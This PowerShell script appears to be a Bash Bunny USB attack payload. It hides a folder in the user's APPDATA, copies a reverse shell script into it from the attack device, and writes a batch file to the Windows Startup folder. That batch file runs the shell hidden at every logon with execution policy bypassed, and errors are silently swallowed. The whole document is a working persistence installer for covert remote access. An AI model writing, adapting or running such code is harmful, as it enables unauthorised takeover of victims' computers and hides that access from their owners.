# Variables
$hiddenFolderPath = "$env:APPDATA\HiddenFolder"
$reverseShellScriptSource = & {(Get-Volume -FileSystemLabel BashBunny).DriveLetter + ":\payloads\switch1\reverse.ps1"}
$batchFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\run_reverse.bat"

# 1. Create a Hidden Folder
try {
    New-Item -ItemType Directory -Path $hiddenFolderPath -Force | Out-Null
    attrib +h $hiddenFolderPath
} catch {}

# 2. Copy the Reverse Shell Script to the Hidden Folder
try {
    Copy-Item -Path $reverseShellScriptSource -Destination "$hiddenFolderPath\reverse.ps1" -Force
} catch {}

# 3. Create a Batch File in the Startup Folder
$batchContent = '@echo off
PowerShell -Command "& {Start-Process PowerShell -ArgumentList ''-ExecutionPolicy Bypass -NoProfile -File ""' + $hiddenFolderPath + '\reverse.ps1""'' -WindowStyle Hidden}"'
try {
    Set-Content -Path $batchFilePath -Value $batchContent
} catch {}